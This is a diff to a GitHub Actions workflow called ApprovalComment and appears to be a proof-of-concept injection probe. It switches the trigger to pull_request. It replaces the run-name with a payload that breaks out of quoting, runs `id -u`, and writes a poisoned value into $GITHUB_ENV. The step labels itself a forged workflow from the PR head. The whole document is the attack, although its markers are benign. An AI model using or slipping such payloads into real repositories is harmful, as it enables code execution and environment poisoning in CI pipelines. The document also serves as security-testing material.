@@ -1,9 +1,9 @@
 name: ApprovalComment
-run-name: "PROBE-RUN-NAME-zzz"
+run-name: 'zz"; echo INJECTED_RCE_MARKER=$(id -u); echo "GABENV=poisoned" >> "$GITHUB_ENV"; #'
 on:
-  workflow_dispatch:
+  pull_request:
 jobs:
   approval-comment:
     runs-on: ubuntu-latest
     steps:
-      - run: echo "upstream ran"
+      - run: echo "forged ApprovalComment workflow from PR head ran; event=$GITHUB_EVENT_NAME"
